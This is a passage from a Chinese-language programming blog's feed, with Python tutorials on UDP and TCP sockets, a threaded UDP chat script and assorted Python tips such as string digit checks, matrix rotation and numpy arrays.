class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;receive_data, from_addr = udp_socket.recvfrom(buffersize) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 3. 接受消息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# buffersize:指定一次接受的字节大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# return:返回为一个元祖，第一个参数表示接受的数据，第二个参数表示消息来源地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;udp_socket.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 4. 关闭套接字 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;UDP多线程聊天室&quot;&gt;&lt;a href=&quot;#UDP多线程聊天室&quot; class=&quot;headerlink&quot; title=&quot;UDP多线程聊天室&quot;&gt;&lt;/a&gt;UDP多线程聊天室&lt;/h3&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; threading&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;is_exit_send_msg = &lt;span class=&quot;literal&quot;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;send_msg&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;udp_socket, dest_addr&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;global&lt;/span&gt; is_exit_send_msg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        send_data = &lt;span class=&quot;built_in&quot;&gt;input&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;请输入要发送的内容：\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; send_data == &lt;span class=&quot;string&quot;&gt;&amp;quot;exit&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            is_exit_send_msg = &lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;退出发送消息&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        udp_socket.sendto(send_data.encode(&lt;span class=&quot;string&quot;&gt;&amp;quot;GBK&amp;quot;&lt;/span&gt;), dest_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;receive_msg&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;udp_socket&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;global&lt;/span&gt; is_exit_send_msg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        receive_data, from_addr = udp_socket.recvfrom(&lt;span class=&quot;number&quot;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; receive_data.decode(&lt;span class=&quot;string&quot;&gt;&amp;quot;GBK&amp;quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&amp;quot;exit&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;退出接收消息&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;str&lt;/span&gt;(from_addr)+&lt;span class=&quot;string&quot;&gt;&amp;quot; 发来消息：\n&amp;quot;&lt;/span&gt;+receive_data.decode(&lt;span class=&quot;string&quot;&gt;&amp;quot;GBK&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; is_exit_send_msg:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;请输入要发送的内容:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;():&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 1.创建udp socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 2.输入要连接的ip和端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dest_ip = &lt;span class=&quot;built_in&quot;&gt;input&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;输入要连接的ip:\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dest_port = &lt;span class=&quot;built_in&quot;&gt;int&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;input&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;输入端口号：\n&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dest_addr = (dest_ip, dest_port)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 3.创建发送消息线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    thread_send = threading.Thread(target=send_msg, args=(udp_socket, dest_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 4.创建接收消息线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    thread_receive = threading.Thread(target=receive_msg, args=(udp_socket,))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 5.开启发送消息线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    thread_send.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 6.开启接收消息线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    thread_receive.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    main()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;TCP&quot;&gt;&lt;a href=&quot;#TCP&quot; class=&quot;headerlink&quot; title=&quot;TCP&quot;&gt;&lt;/a&gt;TCP&lt;/h2&gt;&lt;h3 id=&quot;TCP客户端&quot;&gt;&lt;a href=&quot;#TCP客户端&quot; class=&quot;headerlink&quot; title=&quot;TCP客户端&quot;&gt;&lt;/a&gt;TCP客户端&lt;/h3&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#创建套接字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp_socket = socket.socket(AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#连接服务器，需指定服务器ip和端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp_socket.connet((ip,port))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#发送数据/接受数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp_socket.send(&lt;span class=&quot;string&quot;&gt;&amp;quot;我是发送的消息&amp;quot;&lt;/span&gt;.encode(&lt;span class=&quot;string&quot;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;receive_data = tcp_socket.recv(&lt;span class=&quot;number&quot;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#关闭套接字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp_socket.close() &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;TCP服务端&quot;&gt;&lt;a href=&quot;#TCP服务端&quot; class=&quot;headerlink&quot; title=&quot;TCP服务端&quot;&gt;&lt;/a&gt;TCP服务端&lt;/h3&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 创建套接字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp_server_socket = socket.socket(AF_INET,socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 绑定服务端ip和端口 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp_server_socket.bind((ip,port)) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 开启监听，监听客户端连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tcp_server_socket.listen(&lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# max:表示同时客户端最大的连接数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# accept:接受一个客户端连接并返回一个处理这个连接的socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new_client_socket,client_addr = tcp_server_socket.accept() &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# new_client_socket:处理这个连接的socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# client_addr:连接客户端的地址（ip和端口号）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 接受/发送消息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;receive_data=new_client_socket.recv(&lt;span class=&quot;number&quot;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new_client_socket.send(&lt;span class=&quot;string&quot;&gt;&amp;quot;我是发送的消息&amp;quot;&lt;/span&gt;.encode(&lt;span class=&quot;string&quot;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;)) &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Program Language" scheme="https://hejueyun.github.io/categories/Program-Language/"/>
    
    <category term="Python" scheme="https://hejueyun.github.io/categories/Program-Language/Python/"/>
    
    <category term="Advanced" scheme="https://hejueyun.github.io/categories/Program-Language/Python/Advanced/"/>
    
    
  </entry>
  
  <entry>
    <title>python小知识-2</title>
    <link href="https://hejueyun.github.io/posts/ccd71406/"/>
    <id>https://hejueyun.github.io/posts/ccd71406/</id>
    <published>2020-09-23T08:27:59.000Z</published>
    <updated>2021-04-25T07:09:09.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python中str函数isdigit、isdecimal、isnumeric的区别"><a href="#python中str函数isdigit、isdecimal、isnumeric的区别" class="headerlink" title="python中str函数isdigit、isdecimal、isnumeric的区别"></a>python中str函数isdigit、isdecimal、isnumeric的区别</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="string">&quot;四&quot;</span> <span class="comment"># 汉字</span></span><br><span class="line">num.isdigit()   <span class="comment"># False</span></span><br><span class="line">num.isdecimal() <span class="comment"># False</span></span><br><span class="line">num.isnumeric() <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h2 id="判断奇偶数"><a href="#判断奇偶数" class="headerlink" title="判断奇偶数"></a>判断奇偶数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> i &amp; <span class="number">1</span> == <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="python矩阵旋转"><a href="#python矩阵旋转" class="headerlink" title="python矩阵旋转"></a>python矩阵旋转</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span>(<span class="params">self, matrix</span>):</span></span><br><span class="line">    matrix[:] = <span class="built_in">map</span>(<span class="built_in">list</span>,<span class="built_in">zip</span>(*matrix[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><ul><li><code>matrix[::-1]</code>: 上下翻转</li></ul><h2 id="安全随机数"><a href="#安全随机数" class="headerlink" title="安全随机数"></a>安全随机数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line">secret_generator=secrets.SystemRandom()</span><br><span class="line">secret_generator.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br></pre></td></tr></table></figure><h2 id="全局变量与局部变量"><a href="#全局变量与局部变量" class="headerlink" title="全局变量与局部变量"></a>全局变量与局部变量</h2><ul><li>局部变量是在某个函数内部声明的，只能在函数内部使用，如果超出使用范围（函数外部），则会报错<ul><li>报错信息NameError: name ‘a’ is not defined</li></ul></li></ul><h2 id="数组与列表"><a href="#数组与列表" class="headerlink" title="数组与列表"></a>数组与列表</h2><ul><li>Numpy是一个专门用于数据处理的库，能很好的支持一些数学运算，而列表进行数学运算则比较麻烦</li><li>列表存储的是一维数据，而数组则能存储多维数据</li></ul><blockquote><p>Numpy是专门针对数组的操作和运算进行了设计，所以数组的存储效率和输入输出性能远优于Python中的嵌套列表，数组越大，Numpy的优势就越明显。通常Numpy数组中的所有元素的类型都是相同的，而Python列表中的元素类型是任意的，所以在通用性能方面Numpy数组不及Python列表，但在科学计算中，可以省掉很多循环语句，代码使用方面比Python列表简单的多</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">b = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]）</span><br><span class="line">c = a * <span class="number">2</span></span><br><span class="line">d = b * <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#［1， 2， 3， 4， 1， 2， 3， 4］</span></span><br><span class="line"><span class="comment">#［2 4 6 8］</span></span><br></pre></td></tr></table></figure><h2 id="python内存管理"><a href="#python内存管理" class="headerlink" title="python内存管理"></a>python内存管理</h2><ul><li>垃圾回收</li><li>内存池</li></ul><h3 id="内存池机制"><a href="#内存池机制" class="headerlink" title="内存池机制"></a>内存池机制</h3><blockquote><p>Python提供了对内存的垃圾收集机制，<strong>但是它将不用的内存放到内存池而不是返回给操作系统</strong>。</p><p>Python中所有小于256个字节的对象都使用pymalloc实现的分配器，而大的对象则使用系统的 malloc。另外Python对象，如整数，浮点数和List，都有其独立的私有内存池，对象间不共享他们的内存池。也就是说如果你分配又释放了大量的整数，用于缓存这些整数的内存就不能再分配给浮点数</p></blockquote><h2 id="dict取不存在的值"><a href="#dict取不存在的值" class="headerlink" title="dict取不存在的值"></a>dict取不存在的值</h2><ul><li><code>python 3: dict.get(key,default=None)</code><ul><li>返回指定键的值，如果值不在字典中返回默认值None</li></ul></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/jebeljebel/p/4006433.html">python中str函数isdigit、isdecimal、isnumeric的区别 - 降龙伏虎 - 博客园</a></li><li><a href="https://blog.csdn.net/wem603947175/article/details/82532799">一行代码搞定矩阵旋转—–Python_西山枫叶-CSDN博客</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;python中str函数isdigit、isdecimal、isnumeric的区别&quot;&gt;&lt;a href=&quot;#python中str函数isdigit、isdecimal、isnumeric的区别&quot; class=&quot;headerlink&quot; title=&quot;python中str函数isdigit、isdecimal、isnumeric的区别&quot;&gt;&lt;/a&gt;python中str函数isdigit、isdecimal、isnumeric的区别&lt;/h2&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;num = &lt;span class=&quot;string&quot;&gt;&amp;quot;四&amp;quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# 汉字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;num.isdigit()   &lt;span class=&quot;comment&quot;&gt;# False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;num.isdecimal() &lt;span class=&quot;comment&quot;&gt;# False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;num.isnumeric() &lt;span class=&quot;comment&quot;&gt;# 